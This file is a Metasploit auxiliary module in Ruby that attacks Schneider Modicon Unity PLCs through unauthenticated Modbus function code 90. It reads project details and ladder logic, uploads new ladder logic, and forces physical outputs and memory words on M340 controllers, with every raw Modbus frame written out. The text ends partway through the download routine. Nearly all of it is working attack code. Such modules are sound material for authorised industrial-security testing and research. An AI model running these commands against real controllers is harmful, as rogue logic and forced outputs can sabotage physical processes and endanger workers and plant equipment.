##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp
  include Msf::Auxiliary::Report
  def initialize(info = {})
    super(update_info(info,
    'Name' => 'Schneider Modicon Ladder Logic Upload/Download',
    'Description' => %q{
      The Schneider Modicon with Unity series of PLCs use Modbus function
      code 90 (0x5a) to send and receive ladder logic. The protocol is
      unauthenticated, and allows a rogue host to retrieve the existing
      logic and to upload new logic.
      Three actions are supported : Gather informations,
      download the ladder logic or upload a new ladder logic.
      In either mode, FILENAME must be set to a valid path to an existing
      file (UPLOAD) or a new file (DOWNLOAD), and the directory must
      already exist. The default, 'modicon_ladder.apx' is a blank
      ladder logic file which can be used for testing.
      This module is based on the original 'modiconstux.rb' Basecamp module from
      DigitalBond.
    },
    'Author' =>
    [
      'Arnaud Soullie <arnaud.soullie[at]solucom.fr>', # fix module, add info gathering, refactor
      'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
      'todb' # Metasploit fixups
    ],
    'License' => MSF_LICENSE,
    'References' =>
    [
      [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
    ],
    'DisclosureDate' => 'Apr 5 2012',
    'Actions' =>
    [
      ['GATHER_INFOS', { 'Description' => 'Get informations about the PLC configuration' } ],
      ['DOWNLOAD', { 'Description' => 'Download the ladder logic from the PLC' } ],
      ['UPLOAD', { 'Description' => 'Upload a ladder logic file to the PLC' } ],
      ['FORCE_M340_OUTPUTS', { 'Description' => 'Try forcing some bits on M340' } ],
      ['FORCE_M340_WORDS', { 'Description' => 'Try forcing some words on M340' } ],
    ]
    ))
    register_options(
    [
      OptString.new('FILENAME',
      [
        true,
        "The file to send or receive",
        File.join(Msf::Config.data_directory, "exploits", "test.smbp")
        ]),
        Opt::RPORT(502)
        ], self.class)
      end
      def run
        unless valid_filename?
          print_error "FILENAME invalid: #{datastore['FILENAME'].inspect}"
          return nil
        end
        @modbus_counter = 0x0000 # used for modbus frames
        connect
        #init
        case datastore['ACTION']
        when "DOWNLOAD"
          readfile
        when "UPLOAD"
          writefile
        when "GATHER_INFOS"
          gather_infos
        when "FORCE_M340_OUTPUTS"
          force_m340_outputs
        when "FORCE_M340_WORDS"
          force_m340_words
        end

      end
      def handle_error(response)
        case response.reverse.unpack("c")[0].to_i
        when 1
          print_error("Error : ILLEGAL FUNCTION")
        when 2
          print_error("Error : ILLEGAL DATA ADDRESS")
        when 3
          print_error("Error : ILLEGAL DATA VALUE")
        when 4
          print_error("Error : SLAVE DEVICE FAILURE")
        when 6
          print_error("Error : SLAVE DEVICE BUSY")
        else
          print_error("Unknown error")
        end
        exit
      end
      def valid_filename?
        if datastore['MODE'] == "SEND"
          File.readable? datastore['FILENAME']
        else
          File.writable?(File.split(datastore['FILENAME'])[0].to_s)
        end
      end
      # this is used for building a Modbus frame
      # just prepends the payload with a modbus header
      def make_frame(packetdata)
        if packetdata.size > 255
          print_error("#{rhost}:#{rport} - MODBUS - Packet too large: #{packetdata.inspect}")
          return
        end
        payload = [@modbus_counter].pack("n")
        payload += "\x00\x00\x00" #dunno what these are
        payload += [packetdata.size].pack("c") # size byte
        payload += packetdata
      end
      # a wrapper just to be sure we increment the counter
      def send_frame(payload)
        sock.put(payload)
        @modbus_counter += 1
        r = sock.get(sock.def_read_timeout)
        if r.nil?
          print_error("No answer from target")
          exit
        elsif r.unpack("C*")[-2] == 218
          print_error("Apparently there is an error")
          #handle_error(r)
        else
          return r
        end
      end
      # This function sends some initialization requests
      # required for priming the Quantum
      def init
        send_frame(make_frame("\x00\x5a\x00\x02"))
        send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
        send_frame(make_frame("\x00\x5a\x00\x03\x00"))
        send_frame(make_frame("\x00\x5a\x00\x03\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        payload = "\x00\x5a\x00\x0a\x00"
        (0..0xf9).each { |x| payload += [x].pack("c") }
        send_frame(make_frame(payload))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x5a\x01\x00\x00\xf6\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x5a\x02\x00\x00\xf6\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x46\x03\x00\x00\xf6\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x3c\x04\x00\x00\xf6\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x32\x05\x00\x00\xf6\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x28\x06\x00\x00\x0c\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
        payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
        #payload += "USER-714E74F21B" # Yep, really
        payload += "META-SPLOITMETA"
        send_frame(make_frame(payload))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x0b"))
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x07"))
        send_frame(make_frame("\x00\x5a\x01\x12"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x01\x12"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x00\x02"))
        send_frame(make_frame("\x00\x5a\x00\x58\x01\x00\x00\x00\x00\xff\xff\x00\x70"))
        send_frame(make_frame("\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"))
      end
      def gather_infos
        print_status("Sending initialization requests ...")
        api = send_frame(make_frame("\x00\x5a\x00\x02"))
        print_good("PLC model : " + api.split[1].to_s + ' ' + api.split[2] + ' ' + api.split[3][0..3])
        send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
        project = send_frame(make_frame("\x00\x5a\x00\x03\x00"))
        project_name = project.to_s
        print_good('Project name : ' + project_name[49..-1])
        send_frame(make_frame("\x00\x5a\x00\x03\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        host = send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        host_name = host.to_s
        #print_good('host : ' + host_name)
        print_good('Hostname running Unity : ' + host_name[19..-1])
        payload = "\x00\x5a\x00\x0a\x00"
        (0..0xf9).each { |x| payload += [x].pack("c") }
        send_frame(make_frame(payload))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
        data = send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
        tableau = []
        data.bytes.each do |byte|
          tableau.push(byte.to_s)
        end
        @uaelbat = tableau.reverse
        nb_to_delete = 1
        for i in 1..tableau.size
          if @uaelbat[i].to_s != '0'
            break
          elsif @uaelbat[i].to_s == '0'
            nb_to_delete +=1
          end
        end
        tableau2 = @uaelbat[nb_to_delete..@uaelbat.size]
        test = tableau2.split('0')
        unity_version = ''
        test[0].each do |char|
          unity_version += [char.to_i].pack("c")
        end
        print_good("Unity software version : " + unity_version.reverse)
        comments =''
        test[7].each do |char|
          comments += [char.to_i].pack("c")
        end
        print_good("Project comments : " + comments.reverse)
      end

      def force_m340_outputs
        print_status("Sending initialization requests ...")
        api = send_frame(make_frame("\x00\x5a\x00\x02"))
        #print_good("PLC model : " + api.split[1].to_s + ' ' + api.split[2] + ' ' + api.split[3][0..3])
        send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
        project = send_frame(make_frame("\x00\x5a\x00\x03\x00"))
        project_name = project.to_s
        #print_good('Project name : ' + project_name[49..-1])
        send_frame(make_frame("\x00\x5a\x00\x03\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        host = send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        host_name = host.to_s
        #print_good('host : ' + host_name)
        #print_good('Hostname running Unity : ' + host_name[19..-1])
        payload = "\x00\x5a\x00\x0a\x00"
        (0..0xf9).each { |x| payload += [x].pack("c") }
        send_frame(make_frame(payload))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
        data = send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
        tableau = []
        data.bytes.each do |byte|
          tableau.push(byte.to_s)
        end
        @uaelbat = tableau.reverse
        nb_to_delete = 1
        for i in 1..tableau.size
          if @uaelbat[i].to_s != '0'
            break
          elsif @uaelbat[i].to_s == '0'
            nb_to_delete +=1
          end
        end
        tableau2 = @uaelbat[nb_to_delete..@uaelbat.size]
        test = tableau2.split('0')
        unity_version = ''
        test[0].each do |char|
          unity_version += [char.to_i].pack("c")
        end
        #print_good("Unity software version : " + unity_version.reverse)
        comments =''
        test[7].each do |char|
          comments += [char.to_i].pack("c")
        end
        #print_good("Project comments : " + comments.reverse)
        # Force some bits
        sleep_time = 5

        # Send some garbage
        data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x09\x01\x22\x00\x07\x00\x09\x02\x0b\x00\x01\x00\x07"))
        data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x07"))

        #data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x04\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)
        # data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x04\x05\x01\x04\x00\x00\x00\x02"))
        # sleep(sleep_time)
        # data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x04\x05\x01\x04\x00\x00\x00\x02"))
        # sleep(sleep_time)

        print_status("Sending request to set Q0.16 to 1")
        data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x02\x05\x01\x04\x00\x00\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x03\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to set Q0.16 to 0")
        data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x02\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to unforce Q0.16")
        data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x04\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)

        print_status("Sending request to set Q0.17 to 1")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x11\x00\x01\x00\x00\x00\x03"))
        sleep(sleep_time)
        print_status("Sending request to set Q0.17 to 0")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x11\x00\x01\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to unforce Q0.17")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x11\x00\x01\x00\x00\x00\x04"))
        sleep(sleep_time)

        print_status("Sending request to set Q0.18 to 1")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x12\x00\x01\x00\x00\x00\x03"))
        sleep(sleep_time)
        print_status("Sending request to set Q0.18 to 0")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x12\x00\x01\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to unforce Q0.18")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x12\x00\x01\x00\x00\x00\x04"))
        sleep(sleep_time)

        print_status("Sending request to set Q0.19 to 1")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x13\x00\x01\x00\x00\x00\x03"))
        sleep(sleep_time)
        print_status("Sending request to set Q0.19 to 0")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x13\x00\x01\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to unforce Q0.19")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x13\x00\x01\x00\x00\x00\x04"))

        print_status("Sending request to set Q0.20 to 1")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x14\x00\x01\x00\x00\x00\x03"))
        sleep(sleep_time)
        print_status("Sending request to set Q0.20 to 0")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x14\x00\x01\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to unforce Q0.20")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x14\x00\x01\x00\x00\x00\x04"))

        print_status("Sending request to set Q0.21 to 1")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x15\x00\x01\x00\x00\x00\x03"))
        sleep(sleep_time)
        print_status("Sending request to set Q0.22 to 0")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x15\x00\x01\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to unforce Q0.22")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x15\x00\x01\x00\x00\x00\x04"))

        print_status("Sending request to set Q0.23 to 1")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x16\x00\x01\x00\x00\x00\x03"))
        sleep(sleep_time)
        print_status("Sending request to set Q0.23 to 0")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x16\x00\x01\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to unforce Q0.23")
        data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x16\x00\x01\x00\x00\x00\x04"))


        # sleep 2
        # print_status("Sending request to set %MW2 to 0")
        #
        # send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0e\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa4\x01\x00\x00\x00\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        # sleep 2
        # print_status("Sending request to set %MW2 to 1")
        # send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0e\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa4\x01\x00\x00\x01\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        # send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x12\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa6\x01\x00\x00\x01\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        # print_status("Sending request to set %MW4 to 1")
        # send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x14\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa8\x01\x00\x00\x00\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        # sleep 2
        # #print_status("Sending request to unforce Q0.18")
        #data = send_frame(make_frame("\x00\x5a\x00\x71\x04\x00\x00\x00\x01\x00\x01\x20\x02\x01\x00\x13\x00\x01\x00\x00\x00\x04"))
      end


      def force_m340_words
        print_status("Sending initialization requests ...")
        api = send_frame(make_frame("\x00\x5a\x00\x02"))
        #print_good("PLC model : " + api.split[1].to_s + ' ' + api.split[2] + ' ' + api.split[3][0..3])
        send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
        project = send_frame(make_frame("\x00\x5a\x00\x03\x00"))
        project_name = project.to_s
        #print_good('Project name : ' + project_name[49..-1])
        send_frame(make_frame("\x00\x5a\x00\x03\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        host = send_frame(make_frame("\x00\x5a\x00\x01\x00"))
        host_name = host.to_s
        #print_good('host : ' + host_name)
        #print_good('Hostname running Unity : ' + host_name[19..-1])
        payload = "\x00\x5a\x00\x0a\x00"
        (0..0xf9).each { |x| payload += [x].pack("c") }
        send_frame(make_frame(payload))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x04"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
        send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
        data = send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
        tableau = []
        data.bytes.each do |byte|
          tableau.push(byte.to_s)
        end
        @uaelbat = tableau.reverse
        nb_to_delete = 1
        for i in 1..tableau.size
          if @uaelbat[i].to_s != '0'
            break
          elsif @uaelbat[i].to_s == '0'
            nb_to_delete +=1
          end
        end
        tableau2 = @uaelbat[nb_to_delete..@uaelbat.size]
        test = tableau2.split('0')
        unity_version = ''
        test[0].each do |char|
          unity_version += [char.to_i].pack("c")
        end
        #print_good("Unity software version : " + unity_version.reverse)
        comments =''
        test[7].each do |char|
          comments += [char.to_i].pack("c")
        end
        #print_good("Project comments : " + comments.reverse)
        # Force some bits
        sleep_time = 5

        # Send some garbage
        # data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x09\x01\x22\x00\x07\x00\x09\x02\x0b\x00\x01\x00\x07"))
        # data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x07"))

        #data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x04\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)
        # data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x04\x05\x01\x04\x00\x00\x00\x02"))
        # sleep(sleep_time)
        # data = send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0c\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0c\x01\x2d\x00\x0c\x00\x00\x00\x0b\x00\x01\x04\x05\x01\x04\x00\x00\x00\x02"))
        # sleep(sleep_time)

        print_status("Sending request to set %MW1 to 0")
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0e\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa2\x01\x00\x00\x00\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to set %MW1 to 1")
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0e\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa2\x01\x00\x00\x00\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x03"))
        sleep(sleep_time)

        print_status("Sending request to set %MW2 to 0")
        sleep(sleep_time)
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0e\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa4\x01\x00\x00\x00\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to set %MW2 to 1")
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x0e\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa4\x01\x00\x00\x01\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x12\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa6\x01\x00\x00\x01\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x03"))
        sleep(sleep_time)

        print_status("Sending request to set %MW3 to 1")
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x14\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa8\x01\x00\x00\x00\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x02"))
        sleep(sleep_time)
        print_status("Sending request to set %MW3 to 0")
        send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x03\x01\x02\x14\x00\x0c\x00\x03\x02\x00\x00\x0c\x00\x0a\x2b\x00\xa8\x01\x00\x00\x00\x00\x01\x00\x01\x05\x01\x04\x00\x00\x00\x03"))
        sleep(sleep_time)
      end

      # Write the contents of local file filename to the target's filenumber
      # blank logic files will be available on the Digital Bond website
      def writefile
        print_status "#{rhost}:#{rport} - MODBUS - Sending write request"
        #blocksize = 244 # bytes per block in file transfer
        blocksize = 218 # bytes per block in file transfer
        buf = File.open(datastore['FILENAME'], 'rb') { |io| io.read }
        fullblocks = buf.length / blocksize
        #if fullblocks > 255
        # print_error("#{rhost}:#{rport} - MODBUS - File too large, aborting.")
        # return
        #end
        print_status "Total number of blocks : #{fullblocks}"
        lastblocksize = buf.length - (blocksize*fullblocks)
        lastblocksize_enhexa = [lastblocksize].pack("c")
        print_status "Last block size : #{lastblocksize}"
        fileblocks = fullblocks
        if lastblocksize != 0
          fileblocks += 1
        end
        filetype = buf[0..2]
        if filetype == "APX"
          filenum = "\x01"
        elsif filetype == "APB"
          filenum = "\x10"
        end
        send_frame(make_frame("\x00\x5a\x01\x41\xff\x00"))
        send_frame(make_frame("\x00\x5a\x00\x03\x01"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x00\x02"))
        send_frame(make_frame("\x00\x5a\x00\x02"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x00\x58\x02\x01\x00\x00\x00\x00\x00\xe1\x00"))
        send_frame(make_frame("\x00\x5a\x00\x02"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        send_frame(make_frame("\x00\x5a\x00\x03\x01"))
        send_frame(make_frame("\x00\x5a\x00\x02"))
        send_frame(make_frame("\x00\x5a\x00\x02"))
        send_frame(make_frame("\x00\x5a\x01\x04"))
        payload = "\x00\x5a\x01\x30\x00"
        payload += filenum
        response = send_frame(make_frame(payload))
        if response[8..9] == "\x01\xfe"
          print_status("#{rhost}:#{rport} - MODBUS - Write request success! Writing file...")
        else
          print_error("#{rhost}:#{rport} - MODBUS - Write request error. Aborting.")
          return
        end
        payload = "\x00\x5a\x01\x04"
        send_frame(make_frame(payload))
        block = 1
        block2 = 0
        block_nb = 1
        block2status = 0 # block 2 must always be sent twice
        while block_nb < (fileblocks - 1)
          block_nb = block2*16*16 + block
          if block == 256
            block = 0
            block2 += 1
          end
          payload = "\x00\x5a\x01\x31\x00"
          payload += filenum
          payload += [block].pack("c")
          payload += [block2].pack("c")
          payload += "\xda\x00"
          payload += buf[(((block2*16*16 + block) - 1) * 218)..(((block2*16*16 + block) * 218) - 1)]
          res = send_frame(make_frame(payload))
          print_status "Envoi du block #{block_nb}/#{fullblocks} (#{block2}::#{block})"
          if res[8..9] != "\x01\xfe"
            print_error("#{rhost}:#{rport} - MODBUS - Failure writing block #{block_nb}")
            return
          end
          # redo this iteration of the loop if we're on block 2
          if block2status == 0 and block == 2
            print_status("#{rhost}:#{rport} - MODBUS - Sending block 2 a second time")
            block2status = 1
            redo
          end
          block += 1
        end
        if lastblocksize > 0
          print_status "Last Block !"
          print_status "Size : #{lastblocksize}"
          payload = "\x00\x5a\x01\x31\x00"
          payload += filenum
          payload += [block].pack("c")
          payload += [block2].pack("c")
          payload += [lastblocksize].pack("c") + "\x00"
          payload += buf[(((block2*16*16 + block)-1) * 218)..((((block2*16*16 + block)-1) * 218) + lastblocksize)]
          print_status "#{rhost}:#{rport} - MODBUS - Block #{block_nb}: #{payload.inspect}"
          res = send_frame(make_frame(payload))
          if res[8..9] != "\x01\xfe"
            print_error("#{rhost}:#{rport} - MODBUS - Failure writing last block")
            return
          end
        end
        vprint_status "#{rhost}:#{rport} - MODBUS - Closing file"
        payload = "\x00\x5a\x01\x32\x00\x01" + [fileblocks].pack("c") + "\x0a"
        send_frame(make_frame(payload))
      end
      # Only reading the STL file is supported at the moment :(
      def readfile
        print_status "#{rhost}:#{rport} - MODBUS - Sending read request"
        file = File.open(datastore['FILENAME'], 'wb')
        print_status("#{rhost}:#{rport} - MODBUS - Retrieving file")
        filedata = ""


        response = send_frame(make_frame("\x01\x5a\x00\x28\xfb\xff\x01\x00\x01\x00"))
        response = send_frame(make_frame("\x01\x5a\x00\x28\xd4\xfe\x01\x00\xec\x00"))
        response = send_frame(make_frame("\x01\x5a\x00\x28\xc0\xff\x01\x00\x40\x00"))
        response = send_frame(make_frame("\x01\x5a\x00\x28\x00\x02\x00\x00\xec\x00"))
        response = send_frame(make_frame("\x01\x5a\x00\x28\xec\x02\x00\x00\x9b\x00"))
        response = send_frame(make_frame("\x01\x5a\x00\x28\xd4\xfe\x01\x00\xec\x00"))
        response = send_frame(make_frame("\x01\x5a\x00\x28\xc0\xff\x01\x00\x40\x00"))
        response = send_frame(make_frame("\x01\x5a\x00\x28\x00\x80\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xec\x80\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xd8\x81\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xc4\x82\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xb0\x83\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x9c\x84\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x88\x85\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
